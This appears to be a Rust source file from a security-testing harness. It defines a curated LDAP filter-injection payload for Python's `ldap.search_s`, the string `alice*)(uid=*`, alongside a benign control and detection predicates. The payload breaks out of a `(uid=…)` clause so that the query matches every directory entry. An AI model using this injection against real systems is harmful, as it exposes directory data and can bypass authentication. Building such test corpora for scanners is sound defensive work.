//! Python `Cap::LDAP_INJECTION` payloads — `ldap.search_s` filter
//! injection.
//!
//! Vuln payload: a filter fragment whose `*)(uid=*` tail breaks out of
//! the host template's `(uid=…)` clause; the synthesized filter
//! becomes `(|(uid=…)(uid=*))` and matches every directory entry.
//! The harness's instrumented `ldap.search_s` records
//! `ProbeKind::Ldap { entries_returned: 3 }`.
//!
//! Benign control: the same intended username quoted via
//! `ldap.dn.escape_filter_chars`, leaving the filter pinned to a
//! single entry — `entries_returned: 1`, oracle clear.

use super::super::{CuratedPayload, Oracle, PayloadProvenance, PayloadRef};
use crate::dynamic::oracle::ProbePredicate;

pub const PAYLOADS: &[CuratedPayload] = &[
    CuratedPayload {
        bytes: b"alice*)(uid=*",
        label: "ldap-python-filter-wildcard",
        oracle: Oracle::SinkProbe {
            predicates: &[ProbePredicate::QueryResultCountGreaterThan { n: 1 }],
        },
        is_benign: false,
        provenance: PayloadProvenance::Curated,
        since_corpus_version: 10,
        deprecated_at_corpus_version: None,
        fixture_paths: &["tests/dynamic_fixtures/ldap_injection/python/vuln.py"],
        oob_nonce_slot: false,
        probe_predicates: &[ProbePredicate::QueryResultCountGreaterThan { n: 1 }],
        benign_control: Some(PayloadRef {
            label: "ldap-python-benign",
        }),
        no_benign_control_rationale: None,
    },
    CuratedPayload {
        bytes: b"alice",
        label: "ldap-python-benign",
        oracle: Oracle::SinkProbe {
            predicates: &[ProbePredicate::QueryResultCountGreaterThan { n: 1 }],
        },
        is_benign: true,
        provenance: PayloadProvenance::Curated,
        since_corpus_version: 10,
        deprecated_at_corpus_version: None,
        fixture_paths: &["tests/dynamic_fixtures/ldap_injection/python/benign.py"],
        oob_nonce_slot: false,
        probe_predicates: &[],
        benign_control: None,
        no_benign_control_rationale: None,
    },
];
